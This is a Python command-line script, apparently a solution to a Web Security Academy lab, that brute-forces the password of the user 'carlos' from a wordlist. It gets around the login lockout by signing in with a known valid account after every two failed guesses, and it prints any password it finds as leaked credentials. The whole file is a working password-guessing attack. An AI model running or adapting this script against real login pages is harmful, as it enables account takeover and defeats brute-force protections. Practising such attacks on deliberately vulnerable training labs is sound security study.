from http import HTTPStatus
from pathlib import Path

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import Progress
from rich.progress import track
from rich.theme import Theme
custom_theme = Theme({
    "info": "green",
    "warning": "yellow",
    "danger": "bold red"
})
console = Console(theme=custom_theme)


app = typer.Typer()



@app.command()
def run():
    lab_id= '0a6900ae040fa12c807849bf00d900be'
    
    victim_username = 'carlos'
    valid_username = 'wiener'
    valid_pass = 'peter'

    attempt_limit = 2





    logged_in_string = "Your username is:"
    count = 0 
   
    with open("passwords.txt", "r") as file:
        file_lines = file.readlines()
        file_length = len(file_lines)
        with Progress() as progress:
            task = progress.add_task(f"Password fuzzing for {victim_username} ...", total=file_length) 
            for password in file_lines:
                #print(username)
        
                
                if not password:
                    break
               
                # The code snippet you provided is making a POST request to a login endpoint
                # (`https://{lab_id}.web-security-academy.net/login`) with the provided
                # `victim_username` and `password` as form data. It also includes headers such as
                # `host`, `User-Agent`, and `Referer`.
                response = requests.post(
                                        f"https://{lab_id}.web-security-academy.net/login", data= {
                                            "username" : victim_username.strip(),
                                            "password": password.strip()
                                        }, headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login"
                                        })
                response_text = response.text
            # print(response.text)
                if logged_in_string in response_text:
                    console.print(f'\n Leaked credentials {victim_username}:{password.strip()}', style="info")
                    progress.update(task, advance=file_length)
                    break
                    #user_found=True

                else:
                    progress.update(task, advance=1)
                
                count += 1
                # The `if count >= attempt_limit` condition checks if the number of attempts (`count`)
                # has reached or exceeded the specified attempt limit (`attempt_limit`).
                if count >= attempt_limit:
                   # The code snippet is making a POST request to a login endpoint
                   # (`https://{lab_id}.web-security-academy.net/login`) with the provided
                   # `valid_username` and `valid_pass` as form data. It includes headers such as
                   # `host`, `User-Agent`, and `Referer`. This request is used to simulate a login
                   # attempt with valid credentials.
                    response = requests.post(
                                        f"https://{lab_id}.web-security-academy.net/login", data= {
                                            "username" : valid_username.strip(),
                                            "password": valid_pass.strip()
                                        }, headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login"
                                        })
                    count=0

                
                   
        
                

    
    
    



    

  

    

if __name__ == "__main__":
    app()